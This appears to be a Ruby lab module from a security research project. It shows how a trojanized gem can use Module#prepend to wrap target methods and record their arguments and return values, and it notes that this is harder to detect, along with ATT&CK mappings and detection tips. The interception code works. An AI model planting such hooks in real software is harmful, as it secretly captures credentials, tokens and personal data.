# frozen_string_literal: true

# =============================================================================
# RubyGuardian Phase 1b -- EvilLogger Method Interceptor
#
# EDUCATIONAL PURPOSE ONLY -- Authorized security research.
# DO NOT use this module outside of controlled lab environments.
#
# Demonstrates method interception techniques used by trojanized gems.
# This module patches target classes to intercept method calls, capturing
# arguments and return values. It uses Ruby's prepend mechanism to insert
# transparent wrappers around target methods.
#
# MITRE ATT&CK:
#   T1056 - Input Capture
#   T1565.001 - Data Manipulation: Stored Data Manipulation
#
# DETECTION METHODS:
#   - Monitor Module#prepend calls at runtime
#   - Check ancestors chain for unexpected modules
#   - Use TracePoint to detect method redefinition
#   - Static analysis for alias_method / prepend patterns in gems
# =============================================================================

module EvilLogger
  class Interceptor
    # Tracked interception record
    InterceptionRecord = Struct.new(:target_class, :method_name, :args,
                                    :return_value, :timestamp, keyword_init: true)

    attr_reader :targets, :captures, :installed_hooks

    # @param targets [Array<Hash>] Interception target specifications
    #   Each target: { class_name: 'Klass', methods: [:method1, :method2] }
    def initialize(targets: [])
      @targets = targets
      @captures = []
      @installed_hooks = []
      @mutex = Mutex.new
      @max_captures = 1000  # Prevent unbounded memory growth
    end

    # Install interception hooks on all configured targets.
    #
    # EDUCATIONAL: This uses Module#prepend to insert interceptor modules
    # into the method resolution order (MRO). Unlike alias_method chaining,
    # prepend is cleaner and harder to detect because:
    #   - It doesn't create alias methods visible in method lists
    #   - The wrapper module is inserted transparently
    #   - super calls go through the original method naturally
    #
    # Detection: Check klass.ancestors for unexpected interceptor modules
    def install_all!
      @targets.each do |target|
        install_target(target)
      end
    end

    # Install hooks for a single target specification.
    #
    # @param target [Hash] { class_name: 'ClassName', methods: [:m1, :m2] }
    def install_target(target)
      class_name = target[:class_name]
      methods = target[:methods] || []

      # Safely resolve the target class
      klass = resolve_class(class_name)
      return unless klass

      methods.each do |method_name|
        install_method_hook(klass, method_name)
      end
    end

    # Install a single method interception hook.
    #
    # EDUCATIONAL: The interception module captures:
    #   - Method arguments (may contain credentials, tokens, PII)
    #   - Return values (may contain sensitive query results)
    #   - Timing information (for profiling/analysis)
    #
    # The original method behavior is preserved via super.
    def install_method_hook(klass, method_name)
      interceptor = self # Capture reference for closure

      hook_module = Module.new do
        define_method(method_name) do |*args, **kwargs, &block|
          # Record the interception
          interceptor.record_capture(
            target_class: klass.name,
            method_name: method_name,
            args: args,
            kwargs: kwargs
          )

          # Call the original method transparently
          result = super(*args, **kwargs, &block)

          # Record the return value
          interceptor.record_return(klass.name, method_name, result)

          result
        end
      end

      # EDUCATIONAL: prepend inserts the module BEFORE the class in the MRO
      # So our wrapper method gets called first, then calls super
      klass.prepend(hook_module)

      @installed_hooks << {
        class_name: klass.name,
        method: method_name,
        module: hook_module,
        installed_at: Time.now.utc.iso8601
      }
    end

    # Record a method call capture.
    def record_capture(target_class:, method_name:, args:, kwargs: {})
      @mutex.synchronize do
        # Enforce capture limit to prevent memory exhaustion
        @captures.shift if @captures.length >= @max_captures

        @captures << InterceptionRecord.new(
          target_class: target_class,
          method_name: method_name,
          args: sanitize_args(args),
          return_value: nil,
          timestamp: Time.now.utc.iso8601
        )
      end
    end

    # Record the return value of an intercepted call.
    def record_return(class_name, method_name, return_value)
      @mutex.synchronize do
        # Find the most recent matching capture and update it
        capture = @captures.reverse.find do |c|
          c.target_class == class_name && c.method_name == method_name && c.return_value.nil?
        end

        capture&.return_value = sanitize_value(return_value)
      end
    end

    # Return count of active interception hooks.
    def active_count
      @installed_hooks.length
    end

    # Get all captures for a specific class/method.
    def captures_for(class_name: nil, method_name: nil)
      @captures.select do |c|
        (class_name.nil? || c.target_class == class_name) &&
          (method_name.nil? || c.method_name == method_name)
      end
    end

    # Clear all captures (for testing or memory management).
    def clear_captures!
      @mutex.synchronize { @captures.clear }
    end

    # Generate an interception report.
    def report
      {
        targets_configured: @targets.length,
        hooks_installed: @installed_hooks.length,
        total_captures: @captures.length,
        hooks: @installed_hooks.map { |h| "#{h[:class_name]}##{h[:method]}" },
        capture_summary: @captures.group_by(&:target_class).transform_values(&:length)
      }
    end

    private

    # Safely resolve a class name to a Class object.
    def resolve_class(class_name)
      names = class_name.to_s.split('::')
      names.reduce(Object) { |mod, name| mod.const_get(name) }
    rescue NameError
      nil # Class not loaded yet -- silently skip
    end

    # Sanitize captured arguments to prevent memory bloat.
    # Truncate large strings, skip binary data, limit depth.
    def sanitize_args(args)
      args.map { |arg| sanitize_value(arg) }
    rescue StandardError
      ['<sanitization_error>']
    end

    def sanitize_value(value)
      case value
      when String
        value.length > 256 ? "#{value[0, 256]}...(truncated)" : value
      when Numeric, Symbol, NilClass, TrueClass, FalseClass
        value
      when Array
        value.length > 10 ? value[0, 10] + ['...'] : value.map { |v| sanitize_value(v) }
      when Hash
        value.transform_values { |v| sanitize_value(v) }
      else
        "#<#{value.class.name}>"
      end
    rescue StandardError
      '<unknown>'
    end
  end
end
